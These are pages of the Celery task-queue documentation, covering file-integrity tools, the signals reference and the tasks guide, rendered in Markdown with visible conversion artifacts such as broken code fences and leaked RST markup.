### Tripwire

[Tripwire](http://tripwire.com/) is a (now commercial) data integrity tool, with several open source implementations, used to keep cryptographic hashes of files in the file-system, so that administrators can be alerted when they change. This way when the damage is done and your system has been compromised you can tell exactly what files intruders have changed (password files, logs, back-doors, root-kits, and so on). Often this is the only way you'll be able to detect an intrusion.

Some open source implementations include:

  - [OSSEC](http://www.ossec.net/)
  - [Samhain](http://la-samhna.de/samhain/index.html)
  - [Open Source Tripwire](https://github.com/Tripwire/tripwire-open-source)
  - [AIDE](http://aide.sourceforge.net/)

Also, the [ZFS](https://en.wikipedia.org/wiki/ZFS) file-system comes with built-in integrity checks that can be used.

**Footnotes**

1.  <https://blog.nelhage.com/2011/03/exploiting-pickle/>

---

signals.md

---

# Signals

<div class="contents" data-local="">

</div>

Signals allow decoupled applications to receive notifications when certain actions occur elsewhere in the application.

Celery ships with many signals that your application can hook into to augment behavior of certain actions.

## Basics

Several kinds of events trigger signals, you can connect to these signals to perform actions as they trigger.

Example connecting to the `after_task_publish` signal:

`` `python     from celery.signals import after_task_publish      @after_task_publish.connect     def task_sent_handler(sender=None, headers=None, body=None, **kwargs):         # information about task are located in headers for task messages         # using the task protocol version 2.         info = headers if 'task' in headers else body         print('after_task_publish for task id {info[id]}'.format(             info=info,         ))   Some signals also have a sender you can filter by. For example the ``<span class="title-ref"> :signal:\`after\_task\_publish</span> signal uses the task name as a sender, so by providing the `sender` argument to <span class="title-ref">\~celery.utils.dispatch.signal.Signal.connect</span> you can connect your handler to be called every time a task with name <span class="title-ref">"proj.tasks.add"</span> is published:

`` `python     @after_task_publish.connect(sender='proj.tasks.add')     def task_sent_handler(sender=None, headers=None, body=None, **kwargs):         # information about task are located in headers for task messages         # using the task protocol version 2.         info = headers if 'task' in headers else body         print('after_task_publish for task id {info[id]}'.format(             info=info,         ))  Signals use the same implementation as :mod:`django.core.dispatch`. As a ``\` result other keyword parameters (e.g., signal) are passed to all signal handlers by default.

The best practice for signal handlers is to accept arbitrary keyword arguments (i.e., `**kwargs`). That way new Celery versions can add additional arguments without breaking user code.

## Signals

### Task Signals

<div class="signal">

before\_task\_publish

</div>

#### `before_task_publish`

<div class="versionadded">

3.1

</div>

Dispatched before a task is published. Note that this is executed in the process sending the task.

Sender is the name of the task being sent.

Provides arguments:

  - `body`
    
    > Task message body.
    > 
    > This is a mapping containing the task message fields, see \[message-protocol-task-v2\](\#message-protocol-task-v2) and \[message-protocol-task-v1\](\#message-protocol-task-v1) for a reference of possible fields that can be defined.

  - `exchange`
    
    > Name of the exchange to send to or a <span class="title-ref">\~kombu.Exchange</span> object.

  - `routing_key`
    
    > Routing key to use when sending the message.

  - `headers`
    
    > Application headers mapping (can be modified).

  - `properties`
    
    > Message properties (can be modified)

  - `declare`
    
    > List of entities (<span class="title-ref">\~kombu.Exchange</span>, <span class="title-ref">\~kombu.Queue</span>, or <span class="title-ref">\~kombu.binding</span> to declare before publishing the message. Can be modified.

  - `retry_policy`
    
    > Mapping of retry options. Can be any argument to <span class="title-ref">kombu.Connection.ensure</span> and can be modified.

<div class="signal">

after\_task\_publish

</div>

#### `after_task_publish`

Dispatched when a task has been sent to the broker. Note that this is executed in the process that sent the task.

Sender is the name of the task being sent.

Provides arguments:

  - `headers`
    
    > The task message headers, see \[message-protocol-task-v2\](\#message-protocol-task-v2) and \[message-protocol-task-v1\](\#message-protocol-task-v1) for a reference of possible fields that can be defined.

  - `body`
    
    > The task message body, see \[message-protocol-task-v2\](\#message-protocol-task-v2) and \[message-protocol-task-v1\](\#message-protocol-task-v1) for a reference of possible fields that can be defined.

  - `exchange`
    
    > Name of the exchange or <span class="title-ref">\~kombu.Exchange</span> object used.

  - `routing_key`
    
    > Routing key used.

<div class="signal">

task\_prerun

</div>

#### `task_prerun`

Dispatched before a task is executed.

Sender is the task object being executed.

Provides arguments:

  - `task_id`
    
    > Id of the task to be executed.

  - `task`
    
    > The task being executed.

  - `args`
    
    > The tasks positional arguments.

  - `kwargs`
    
    > The tasks keyword arguments.

<div class="signal">

task\_postrun

</div>

#### `task_postrun`

Dispatched after a task has been executed.

Sender is the task object executed.

Provides arguments:

  - `task_id`
    
    > Id of the task to be executed.

  - `task`
    
    > The task being executed.

  - `args`
    
    > The tasks positional arguments.

  - `kwargs`
    
    > The tasks keyword arguments.

  - `retval`
    
    > The return value of the task.

  - `state`
    
    > Name of the resulting state.

<div class="signal">

task\_retry

</div>

#### `task_retry`

Dispatched when a task will be retried.

Sender is the task object.

Provides arguments:

  - `request`
    
    > The current task request.

  - `reason`
    
    > Reason for retry (usually an exception instance, but can always be coerced to <span class="title-ref">str</span>).

  - `einfo`
    
    > Detailed exception information, including traceback (a <span class="title-ref">billiard.einfo.ExceptionInfo</span> object).

<div class="signal">

task\_success

</div>

#### `task_success`

Dispatched when a task succeeds.

Sender is the task object executed.

Provides arguments

  -   - `result`  
        Return value of the task.

<div class="signal">

task\_failure

</div>

#### `task_failure`

Dispatched when a task fails.

Sender is the task object executed.

Provides arguments:

  - `task_id`
    
    > Id of the task.

  - `exception`
    
    > Exception instance raised.

  - `args`
    
    > Positional arguments the task was called with.

  - `kwargs`
    
    > Keyword arguments the task was called with.

  - `traceback`
    
    > Stack trace object.

  - `einfo`
    
    > The <span class="title-ref">billiard.einfo.ExceptionInfo</span> instance.

#### `task_internal_error`

Dispatched when an internal Celery error occurs while executing the task.

Sender is the task object executed.

<div class="signal">

task\_internal\_error

</div>

Provides arguments:

  - `task_id`
    
    > Id of the task.

  - `args`
    
    > Positional arguments the task was called with.

  - `kwargs`
    
    > Keyword arguments the task was called with.

  - `request`
    
    > The original request dictionary. This is provided as the `task.request` may not be ready by the time the exception is raised.

  - `exception`
    
    > Exception instance raised.

  - `traceback`
    
    > Stack trace object.

  - `einfo`
    
    > The <span class="title-ref">billiard.einfo.ExceptionInfo</span> instance.

#### `task_received`

Dispatched when a task is received from the broker and is ready for execution.

Sender is the consumer object.

<div class="signal">

task\_received

</div>

Provides arguments:

  - `request`
    
    > This is a <span class="title-ref">\~celery.worker.request.Request</span> instance, and not `task.request`. When using the prefork pool this signal is dispatched in the parent process, so `task.request` isn't available and shouldn't be used. Use this object instead, as they share many of the same fields.

<div class="signal">

task\_revoked

</div>

#### `task_revoked`

Dispatched when a task is revoked/terminated by the worker.

Sender is the task object revoked/terminated.

Provides arguments:

  - `request`
    
    > This is a <span class="title-ref">\~celery.app.task.Context</span> instance, and not `task.request`. When using the prefork pool this signal is dispatched in the parent process, so `task.request` isn't available and shouldn't be used. Use this object instead, as they share many of the same fields.

  - `terminated`
    
    > Set to <span class="title-ref">True</span> if the task was terminated.

  - `signum`
    
    > Signal number used to terminate the task. If this is <span class="title-ref">None</span> and terminated is <span class="title-ref">True</span> then `TERM` should be assumed.

  - `expired`
    
    Set to <span class="title-ref">True</span> if the task expired.

<div class="signal">

task\_unknown

</div>

#### `task_unknown`

Dispatched when a worker receives a message for a task that's not registered.

Sender is the worker <span class="title-ref">\~celery.worker.consumer.Consumer</span>.

Provides arguments:

  - `name`
    
    Name of task not found in registry.

  - `id`
    
    The task id found in the message.

  - `message`
    
    > Raw message object.

  - `exc`
    
    > The error that occurred.

<div class="signal">

task\_rejected

</div>

#### `task_rejected`

Dispatched when a worker receives an unknown type of message to one of its task queues.

Sender is the worker <span class="title-ref">\~celery.worker.consumer.Consumer</span>.

Provides arguments:

  - `message`
    
    Raw message object.

  - `exc`
    
    > The error that occurred (if any).

### App Signals

<div class="signal">

import\_modules

</div>

#### `import_modules`

This signal is sent when a program (worker, beat, shell) etc, asks for modules in the `include` and `imports` settings to be imported.

Sender is the app instance.

### Worker Signals

<div class="signal">

celeryd\_after\_setup

</div>

#### `celeryd_after_setup`

This signal is sent after the worker instance is set up, but before it calls run. This means that any queues from the `celery worker -Q` option is enabled, logging has been set up and so on.

It can be used to add custom queues that should always be consumed from, disregarding the `celery worker -Q` option. Here's an example that sets up a direct queue for each worker, these queues can then be used to route a task to any specific worker:

`` `python     from celery.signals import celeryd_after_setup      @celeryd_after_setup.connect     def setup_direct_queue(sender, instance, **kwargs):         queue_name = '{0}.dq'.format(sender)  # sender is the nodename of the worker         instance.app.amqp.queues.select_add(queue_name)  Provides arguments:  * ``sender`Node name of the worker.  *`instance``This is the `celery.apps.worker.Worker` instance to be initialized.     Note that only the `app` and `hostname` (nodename) attributes have been     set so far, and the rest of``\_\_init\_\_`hasn't been executed.  *`conf`The configuration of the current app.  .. signal:: celeryd_init`celeryd\_init`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

This is the first signal sent when `celery worker` starts up. The `sender` is the host name of the worker, so this signal can be used to setup worker specific configuration:

`` `python     from celery.signals import celeryd_init      @celeryd_init.connect(sender='worker12@example.com')     def configure_worker12(conf=None, **kwargs):         conf.task_default_rate_limit = '10/m'  or to set up configuration for multiple workers you can omit specifying a ``\` sender when you connect:

`` `python     from celery.signals import celeryd_init      @celeryd_init.connect     def configure_workers(sender=None, conf=None, **kwargs):         if sender in ('worker1@example.com', 'worker2@example.com'):             conf.task_default_rate_limit = '10/m'         if sender == 'worker3@example.com':             conf.worker_prefetch_multiplier = 0  Provides arguments:  * ``sender`Nodename of the worker.  *`instance``This is the `celery.apps.worker.Worker` instance to be initialized.     Note that only the `app` and `hostname` (nodename) attributes have been     set so far, and the rest of``\_\_init\_\_`hasn't been executed.  *`conf`The configuration of the current app.  *`options`Options passed to the worker from command-line arguments (including     defaults).  .. signal:: worker_init`worker\_init`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

Dispatched before the worker is started.

<div class="signal">

worker\_before\_create\_process

</div>

#### `worker_before_create_process`

Dispatched in the parent process, just before new child process is created in the prefork pool. It can be used to clean up instances that don't behave well when forking.

`` `python     @signals.worker_before_create_process.connect     def clean_channels(**kwargs):         grpc_singleton.clean_channel()  .. signal:: worker_ready ``worker\_ready`  `\` \~\~\~\~\~\~\~\~\~\~\~\~\~\~\~\~

Dispatched when the worker is ready to accept work.

<div class="signal">

heartbeat\_sent

</div>

#### `heartbeat_sent`

Dispatched when Celery sends a worker heartbeat.

Sender is the <span class="title-ref">celery.worker.heartbeat.Heart</span> instance.

<div class="signal">

worker\_shutting\_down

</div>

#### `worker_shutting_down`

Dispatched when the worker begins the shutdown process.

Provides arguments:

  - `sig`
    
    > The POSIX signal that was received.

  - `how`
    
    > The shutdown method, warm or cold.

  - `exitcode`
    
    > The exitcode that will be used when the main process exits.

<div class="signal">

worker\_process\_init

</div>

#### `worker_process_init`

Dispatched in all pool child processes when they start.

Note that handlers attached to this signal mustn't be blocking for more than 4 seconds, or the process will be killed assuming it failed to start.

<div class="signal">

worker\_process\_shutdown

</div>

#### `worker_process_shutdown`

Dispatched in all pool child processes just before they exit.

Note: There's no guarantee that this signal will be dispatched, similarly to `finally` blocks it's impossible to guarantee that handlers will be called at shutdown, and if called it may be interrupted during.

Provides arguments:

  - `pid`
    
    > The pid of the child process that's about to shutdown.

  - `exitcode`
    
    > The exitcode that'll be used when the child process exits.

<div class="signal">

worker\_shutdown

</div>

#### `worker_shutdown`

Dispatched when the worker is about to shut down.

### Beat Signals

<div class="signal">

beat\_init

</div>

#### `beat_init`

Dispatched when `celery beat` starts (either standalone or embedded).

Sender is the <span class="title-ref">celery.beat.Service</span> instance.

<div class="signal">

beat\_embedded\_init

</div>

#### `beat_embedded_init`

Dispatched in addition to the `beat_init` signal when `celery
beat` is started as an embedded process.

Sender is the <span class="title-ref">celery.beat.Service</span> instance.

### Eventlet Signals

<div class="signal">

eventlet\_pool\_started

</div>

#### `eventlet_pool_started`

Sent when the eventlet pool has been started.

Sender is the <span class="title-ref">celery.concurrency.eventlet.TaskPool</span> instance.

<div class="signal">

eventlet\_pool\_preshutdown

</div>

#### `eventlet_pool_preshutdown`

Sent when the worker shutdown, just before the eventlet pool is requested to wait for remaining workers.

Sender is the <span class="title-ref">celery.concurrency.eventlet.TaskPool</span> instance.

<div class="signal">

eventlet\_pool\_postshutdown

</div>

#### `eventlet_pool_postshutdown`

Sent when the pool has been joined and the worker is ready to shutdown.

Sender is the <span class="title-ref">celery.concurrency.eventlet.TaskPool</span> instance.

<div class="signal">

eventlet\_pool\_apply

</div>

#### `eventlet_pool_apply`

Sent whenever a task is applied to the pool.

Sender is the <span class="title-ref">celery.concurrency.eventlet.TaskPool</span> instance.

Provides arguments:

  - `target`
    
    > The target function.

  - `args`
    
    > Positional arguments.

  - `kwargs`
    
    > Keyword arguments.

### Logging Signals

<div class="signal">

setup\_logging

</div>

#### `setup_logging`

Celery won't configure the loggers if this signal is connected, so you can use this to completely override the logging configuration with your own.

If you'd like to augment the logging configuration setup by Celery then you can use the `after_setup_logger` and `after_setup_task_logger` signals.

Provides arguments:

  - `loglevel`
    
    > The level of the logging object.

  - `logfile`
    
    > The name of the logfile.

  - `format`
    
    > The log format string.

  - `colorize`
    
    > Specify if log messages are colored or not.

<div class="signal">

after\_setup\_logger

</div>

#### `after_setup_logger`

Sent after the setup of every global logger (not task loggers). Used to augment logging configuration.

Provides arguments:

  - `logger`
    
    > The logger object.

  - `loglevel`
    
    > The level of the logging object.

  - `logfile`
    
    > The name of the logfile.

  - `format`
    
    > The log format string.

  - `colorize`
    
    > Specify if log messages are colored or not.

<div class="signal">

after\_setup\_task\_logger

</div>

#### `after_setup_task_logger`

Sent after the setup of every single task logger. Used to augment logging configuration.

Provides arguments:

  - `logger`
    
    > The logger object.

  - `loglevel`
    
    > The level of the logging object.

  - `logfile`
    
    > The name of the logfile.

  - `format`
    
    > The log format string.

  - `colorize`
    
    > Specify if log messages are colored or not.

### Command signals

<div class="signal">

user\_preload\_options

</div>

#### `user_preload_options`

This signal is sent after any of the Celery command line programs are finished parsing the user preload options.

It can be used to add additional command-line arguments to the `celery` umbrella command:

`` `python     from celery import Celery     from celery import signals     from celery.bin.base import Option      app = Celery()     app.user_options['preload'].add(Option(         '--monitoring', action='store_true',         help='Enable our external monitoring utility, blahblah',     ))      @signals.user_preload_options.connect     def handle_preload_options(options, **kwargs):         if options['monitoring']:             enable_monitoring()   Sender is the `~celery.bin.base.Command` instance, and the value depends ``<span class="title-ref"> on the program that was called (e.g., for the umbrella command it'll be a </span>\~celery.bin.celery.CeleryCommand\`) object).

Provides arguments:

  - `app`
    
    > The app instance.

  - `options`
    
    > Mapping of the parsed user preload options (with default values).

### Deprecated Signals

<div class="signal">

task\_sent

</div>

#### `task_sent`

This signal is deprecated, please use `after_task_publish` instead.

---

sphinx.md

---

# Documenting Tasks with Sphinx

This document describes how auto-generate documentation for Tasks using Sphinx.

## celery.contrib.sphinx

<div class="automodule" data-members="" data-noindex="">

celery.contrib.sphinx

</div>

---

tasks.md

---

# Tasks

Tasks are the building blocks of Celery applications.

A task is a class that can be created out of any callable. It performs dual roles in that it defines both what happens when a task is called (sends a message), and what happens when a worker receives that message.

Every task class has a unique name, and this name is referenced in messages so the worker can find the right function to execute.

A task message is not removed from the queue until that message has been `acknowledged` by a worker. A worker can reserve many messages in advance and even if the worker is killed -- by power failure or some other reason -- the message will be redelivered to another worker.

Ideally task functions should be `idempotent`: meaning the function won't cause unintended effects even if called multiple times with the same arguments. Since the worker cannot detect if your tasks are idempotent, the default behavior is to acknowledge the message in advance, just before it's executed, so that a task invocation that already started is never executed again.

If your task is idempotent you can set the <span class="title-ref">\~Task.acks\_late</span> option to have the worker acknowledge the message *after* the task returns instead. See also the FAQ entry \[faq-acks\_late-vs-retry\](\#faq-acks\_late-vs-retry).

Note that the worker will acknowledge the message if the child process executing the task is terminated (either by the task calling <span class="title-ref">sys.exit</span>, or by signal) even when <span class="title-ref">\~Task.acks\_late</span> is enabled. This behavior is intentional as...

1.  We don't want to rerun tasks that forces the kernel to send a `SIGSEGV` (segmentation fault) or similar signals to the process.
2.  We assume that a system administrator deliberately killing the task does not want it to automatically restart.
3.  A task that allocates too much memory is in danger of triggering the kernel OOM killer, the same may happen again.
4.  A task that always fails when redelivered may cause a high-frequency message loop taking down the system.

If you really want a task to be redelivered in these scenarios you should consider enabling the `task_reject_on_worker_lost` setting.

\> **Warning** \> A task that blocks indefinitely may eventually stop the worker instance from doing any other work.

> If your task does I/O then make sure you add timeouts to these operations, like adding a timeout to a web request using the `requests` library:
> 
>   - \`\`\`python  
>     connect\_timeout, read\_timeout = 5.0, 30.0 response = requests.get(URL, timeout=(connect\_timeout, read\_timeout))
> 
> \[Time limits \<worker-time-limits\>\](\#time-limits-\<worker-time-limits\>) are convenient for making sure all tasks return in a timely manner, but a time limit event will actually kill the process by force so only use them to detect cases where you haven't used manual timeouts yet.
> 
> In previous versions, the default prefork pool scheduler was not friendly to long-running tasks, so if you had tasks that ran for minutes/hours, it was advised to enable the `-Ofair <celery worker -O>` command-line argument to the `celery worker`. However, as of version 4.0, -Ofair is now the default scheduling strategy. See \[optimizing-prefetch-limit\](\#optimizing-prefetch-limit) for more information, and for the best performance route long-running and short-running tasks to dedicated workers (\[routing-automatic\](\#routing-automatic)).
> 
> If your worker hangs then please investigate what tasks are running before submitting an issue, as most likely the hanging is caused by one or more tasks hanging on a network operation.

\--

In this chapter you'll learn all about defining tasks, `` ` and this is the **table of contents**:  .. contents::     :local:     :depth: 1   .. _task-basics:  Basics ======  You can easily create a task from any callable by using the `@task` decorator: ``\`python from .models import User

> @app.task def create\_user(username, password): User.objects.create(username=username, password=password)

There are also many \[options \<task-options\>\](\#options-\<task-options\>) that can be set for the task, `` ` these can be specified as arguments to the decorator: ``\`python @app.task(serializer='json') def create\_user(username, password): User.objects.create(username=username, password=password)

How do I import the task decorator? `` ` -----------------------------------      The task decorator is available on your `@Celery` application instance,     if you don't know what this is then please read [first-steps](#first-steps).      If you're using Django (see [django-first-steps](#django-first-steps)), or you're the author     of a library then you probably want to use the `@shared_task` decorator: ``\`python from celery import shared\_task

> @shared\_task def add(x, y): return x + y

Multiple decorators `` ` -------------------      When using multiple decorators in combination with the task     decorator you must make sure that the `task`     decorator is applied last (oddly, in Python this means it must     be first in the list): ``\`python @app.task @decorator2 @decorator1 def add(x, y): return x + y

Bound tasks `` ` -----------  A task being bound means the first argument to the task will always be the task instance ( ``self`), just like Python bound methods:`\`python logger = get\_task\_logger(\_\_name\_\_)

> @app.task(bind=True) def add(self, x, y): logger.info(self.request.id)

Bound tasks are needed for retries (using <span class="title-ref">Task.retry() \<@Task.retry\></span>), `` ` for accessing information about the current task request, and for any additional functionality you add to custom task base classes.  Task inheritance ----------------  The ``base`argument to the task decorator specifies the base class of the task:`\`python import celery

> class MyTask(celery.Task):
> 
> >   - def on\_failure(self, exc, task\_id, args, kwargs, einfo):  
> >     print('{0\!r} failed: {1\!r}'.format(task\_id, exc))
> 
> @app.task(base=MyTask) def add(x, y): raise KeyError()

<div id="task-names">

Names `` ` =====  Every task must have a unique name.  If no explicit name is provided the task decorator will generate one for you, and this name will be based on 1) the module the task is defined in, and 2) the name of the task function.  Example setting explicit name: ``\`pycon \>\>\> @app.task(name='sum-of-two-numbers') \>\>\> def add(x, y): ... return x + y

</div>

> \>\>\> add.name 'sum-of-two-numbers'

A best practice is to use the module name as a name-space, `` ` this way names won't collide if there's already a task with that name defined in another module. ``\`pycon \>\>\> @app.task(name='tasks.add') \>\>\> def add(x, y): ... return x + y

You can tell the name of the task by investigating its `.name` attribute:

``` pycon
>>> add.name
'tasks.add'
```

The name we specified here (`tasks.add`) is exactly the name that would've `` ` been automatically generated for us if the task was defined in a module named :file:`tasks.py`:  :file:`tasks.py`: ``\`python @app.task def add(x, y): return x + y

``` pycon
>>> from tasks import add
>>> add.name
'tasks.add'
```

\> **Note** \> You can use the <span class="title-ref">inspect</span> command in a worker to view the names of all registered tasks. See the <span class="title-ref">inspect registered</span> command in the \[monitoring-control\](\#monitoring-control) section of the User Guide.

<div id="task-name-generator-info">

Changing the automatic naming behavior `` ` --------------------------------------  .. versionadded:: 4.0  There are some cases when the default automatic naming isn't suitable. Consider having many tasks within many different modules::      project/            /__init__.py            /celery.py            /moduleA/                    /__init__.py                    /tasks.py            /moduleB/                    /__init__.py                    /tasks.py  Using the default automatic naming, each task will have a generated name like `moduleA.tasks.taskA`, `moduleA.tasks.taskB`, `moduleB.tasks.test`, and so on. You may want to get rid of having `tasks` in all task names. As pointed above, you can explicitly give names for all tasks, or you can change the automatic naming behavior by overriding `@gen_task_name`. Continuing with the example, `celery.py` may contain: ``\`python from celery import Celery

</div>

> class MyCelery(Celery):
> 
> >   - def gen\_task\_name(self, name, module):
> >     
> >       - if module.endswith('.tasks'):  
> >         module = module\[:-6\]
> >     
> >     return super().gen\_task\_name(name, module)
> 
> app = MyCelery('main')

So each task will have a name like <span class="title-ref">moduleA.taskA</span>, <span class="title-ref">moduleA.taskB</span> and `` ` `moduleB.test`.  > **Warning** >      Make sure that your `@gen_task_name` is a pure function: meaning     that for the same input it must always return the same output.  .. _task-request-info:  Task Request ============  `Task.request <@Task.request>` contains information and state related to the currently executing task.  The request defines the following attributes:  :id: The unique id of the executing task.  :group: The unique id of the task's [group <canvas-group>](#group-<canvas-group>), if this task is a member.  :chord: The unique id of the chord this task belongs to (if the task         is part of the header).  :correlation_id: Custom ID used for things like de-duplication.  :args: Positional arguments.  :kwargs: Keyword arguments.  :origin: Name of host that sent this task.  :retries: How many times the current task has been retried.           An integer starting at `0`.  :is_eager: Set to `True` if the task is executed locally in            the client, not by a worker.  :eta: The original ETA of the task (if any).       This is in UTC time (depending on the :setting:`enable_utc`       setting).  :expires: The original expiry time of the task (if any).           This is in UTC time (depending on the :setting:`enable_utc`           setting).  :hostname: Node name of the worker instance executing the task.  :delivery_info: Additional message delivery information. This is a mapping                 containing the exchange and routing key used to deliver this                 task. Used by for example `Task.retry() <@Task.retry>`                 to resend the task to the same destination queue.                 Availability of keys in this dict depends on the                 message broker used.  :reply-to: Name of queue to send replies back to (used with RPC result            backend for example).  :called_directly: This flag is set to true if the task wasn't                   executed by the worker.  :timelimit: A tuple of the current ``(soft, hard)``time limits active for             this task (if any).  :callbacks: A list of signatures to be called if this task returns successfully.  :errbacks: A list of signatures to be called if this task fails.  :utc: Set to true the caller has UTC enabled (:setting:`enable_utc`).   .. versionadded:: 3.1  :headers:  Mapping of message headers sent with this task message            (may be `None`).  :reply_to:  Where to send reply to (queue name).  :correlation_id: Usually the same as the task id, often used in amqp                  to keep track of what a reply is for.  .. versionadded:: 4.0  :root_id: The unique id of the first task in the workflow this task           is part of (if any).  :parent_id: The unique id of the task that called this task (if any).  :chain: Reversed list of tasks that form a chain (if any).         The last item in this list will be the next task to succeed the         current task.  If using version one of the task protocol the chain         tasks will be in``request.callbacks``instead.  .. versionadded:: 5.2  :properties: Mapping of message properties received with this task message              (may be `None` or `{}`)  :replaced_task_nesting: How many times the task was replaced, if at all.                         (may be `0`)  Example -------  An example task accessing information in the context is:``\`python @app.task(bind=True) def dump\_context(self, x, y): print('Executing task id {0.id}, args: {0.args\!r} kwargs: {0.kwargs\!r}'.format( self.request))

The `bind` argument means that the function will be a "bound method" so `` ` that you can access attributes and methods on the task type instance.  .. _task-logging:  Logging =======  The worker will automatically set up logging for you, or you can configure logging manually.  A special logger is available named "celery.task", you can inherit from this logger to automatically get the task name and unique id as part of the logs.  The best practice is to create a common logger for all of your tasks at the top of your module: ``\`python from celery.utils.log import get\_task\_logger

> logger = get\_task\_logger(\_\_name\_\_)
> 
> @app.task def add(x, y): logger.info('Adding {0} + {1}'.format(x, y)) return x + y

Celery uses the standard Python logger library, `` ` and the documentation can be found :mod:`here <logging>`.  You can also use `print`, as anything written to standard out/-err will be redirected to the logging system (you can disable this, see :setting:`worker_redirect_stdouts`).  > **Note** >      The worker won't update the redirection if you create a logger instance     somewhere in your task or task module.      If you want to redirect ``sys.stdout`and`sys.stderr`to a custom     logger you have to enable this manually, for example:`\`python import sys

> logger = get\_task\_logger(\_\_name\_\_)
> 
> @app.task(bind=True) def add(self, x, y): old\_outs = sys.stdout, sys.stderr rlevel = self.app.conf.worker\_redirect\_stdouts\_level try: self.app.log.redirect\_stdouts\_to\_logger(logger, rlevel) print('Adding {0} + {1}'.format(x, y)) return x + y finally: sys.stdout, sys.stderr = old\_outs

<div class="note">

<div class="title">

Note

</div>

If a specific Celery logger you need is not emitting logs, you should check that the logger is propagating properly. In this example "celery.app.trace" is enabled so that "succeeded in" logs are emitted:

``` python
import celery
import logging

@celery.signals.after_setup_logger.connect
def on_after_setup_logger(**kwargs):
    logger = logging.getLogger('celery')
    logger.propagate = True
    logger = logging.getLogger('celery.app.trace')
    logger.propagate = True
```

</div>

<div class="note">

<div class="title">

Note

</div>

If you want to completely disable Celery logging configuration, use the `setup_logging` signal:

``` python
import celery

@celery.signals.setup_logging.connect
def on_setup_logging(**kwargs):
    pass
```

</div>

<div id="task-argument-checking">

Argument checking `` ` -----------------  .. versionadded:: 4.0  Celery will verify the arguments passed when you call the task, just like Python does when calling a normal function: ``\`pycon \>\>\> @app.task ... def add(x, y): ... return x + y

</div>

> \# Calling the task with two arguments works: \>\>\> add.delay(8, 8) \<AsyncResult: f59d71ca-1549-43e0-be41-4e8821a83c0c\>
> 
> \# Calling the task with only one argument fails: \>\>\> add.delay(8) Traceback (most recent call last): File "\<stdin\>", line 1, in \<module\> File "celery/app/task.py", line 376, in delay return self.apply\_async(args, kwargs) File "celery/app/task.py", line 485, in apply\_async check\_arguments(*(args or ()),*\*(kwargs or {})) TypeError: add() takes exactly 2 arguments (1 given)

You can disable the argument checking for any task by setting its `` ` `~@Task.typing` attribute to `False`: ``\`pycon \>\>\> @app.task(typing=False) ... def add(x, y): ... return x + y

> \# Works locally, but the worker receiving the task will raise an error. \>\>\> add.delay(8) \<AsyncResult: f59d71ca-1549-43e0-be41-4e8821a83c0c\>

<div id="task-hiding-sensitive-information">

Hiding sensitive information in arguments `` ` -----------------------------------------  .. versionadded:: 4.0  When using :setting:`task_protocol` 2 or higher (default since 4.0), you can override how positional arguments and keyword arguments are represented in logs and monitoring events using the ``argsrepr`and`kwargsrepr`calling arguments:`\`pycon \>\>\> add.apply\_async((2, 3), argsrepr='(\<secret-x\>, \<secret-y\>)')

</div>

> \>\>\> charge.s(account, card='1234 5678 1234 5678').set( ... kwargsrepr=repr({'card': '\***\***\*\* \*\*\*\* 5678'}) ... ).delay()

\> **Warning** \> Sensitive information will still be accessible to anyone able to read your task message from the broker, or otherwise able intercept it.

> For this reason you should probably encrypt your message if it contains sensitive information, or in this example with a credit card number the actual number could be stored encrypted in a secure store that you retrieve and decrypt in the task itself.

<div id="task-retry">

Retrying `` ` ========  `Task.retry() <@Task.retry>` can be used to re-execute the task, for example in the event of recoverable errors.  When you call ``retry`it'll send a new message, using the same task-id, and it'll take care to make sure the message is delivered to the same queue as the originating task.  When a task is retried this is also recorded as a task state, so that you can track the progress of the task using the result instance (see [task-states](#task-states)).  Here's an example using`retry`:`\`python @app.task(bind=True) def send\_twitter\_status(self, oauth, tweet): try: twitter = Twitter(oauth) twitter.update\_status(tweet) except (Twitter.FailWhaleError, Twitter.LoginError) as exc: raise self.retry(exc=exc)

</div>

\> **Note** \> The <span class="title-ref">Task.retry() \<@Task.retry\></span> call will raise an exception so any code after the retry won't be reached. This is the <span class="title-ref">\~@Retry</span> exception, it isn't handled as an error but rather as a semi-predicate to signify to the worker that the task is to be retried, so that it can store the correct state when a result backend is enabled.

> This is normal operation and always happens unless the `throw` argument to retry is set to <span class="title-ref">False</span>.

The bind argument to the task decorator will give access to `self` (the `` ` task type instance).  The ``exc`argument is used to pass exception information that's used in logs, and when storing task results. Both the exception and the traceback will be available in the task state (if a result backend is enabled).  If the task has a`max\_retries`value the current exception will be re-raised if the max number of retries has been exceeded, but this won't happen if:  - An`exc``argument wasn't given.      In this case the `~@MaxRetriesExceededError`     exception will be raised.  - There's no current exception      If there's no original exception to re-raise the``exc`argument will be used instead, so:`\`python self.retry(exc=Twitter.LoginError())

> will raise the `exc` argument given.

<div id="task-retry-custom-delay">

Using a custom retry delay `` ` --------------------------  When a task is to be retried, it can wait for a given amount of time before doing so, and the default delay is defined by the `~@Task.default_retry_delay` attribute. By default this is set to 3 minutes. Note that the unit for setting the delay is in seconds (int or float).  You can also provide the `countdown` argument to `~@Task.retry` to override this default. ``\`python @app.task(bind=True, default\_retry\_delay=30 \* 60) \# retry in 30 minutes. def add(self, x, y): try: something\_raising() except Exception as exc: \# overrides the default delay to retry after 1 minute raise self.retry(exc=exc, countdown=60)

</div>

<div id="task-autoretry">

Automatic retry for known exceptions `` ` ------------------------------------  .. versionadded:: 4.0  Sometimes you just want to retry a task whenever a particular exception is raised.  Fortunately, you can tell Celery to automatically retry a task using `autoretry_for` argument in the `@task` decorator: ``\`python from twitter.exceptions import FailWhaleError

</div>

> @app.task(autoretry\_for=(FailWhaleError,)) def refresh\_timeline(user): return twitter.refresh\_timeline(user)

If you want to specify custom arguments for an internal <span class="title-ref">\~@Task.retry</span> `` ` call, pass `retry_kwargs` argument to `@task` decorator: ``\`python @app.task(autoretry\_for=(FailWhaleError,), retry\_kwargs={'max\_retries': 5}) def refresh\_timeline(user): return twitter.refresh\_timeline(user)

This is provided as an alternative to manually handling the exceptions, `` ` and the example above will do the same as wrapping the task body in a :keyword:`try` ... :keyword:`except` statement: ``\`python @app.task def refresh\_timeline(user): try: twitter.refresh\_timeline(user) except FailWhaleError as exc: raise refresh\_timeline.retry(exc=exc, max\_retries=5)

If you want to automatically retry on any error, simply use:

``` python
@app.task(autoretry_for=(Exception,))
def x():
    ...
```

<div class="versionadded">

4.2

</div>

If your tasks depend on another service, like making a request to an API, `` ` then it's a good idea to use `exponential backoff`_ to avoid overwhelming the service with your requests. Fortunately, Celery's automatic retry support makes it easy. Just specify the `~Task.retry_backoff` argument, like this: ``\`python from requests.exceptions import RequestException

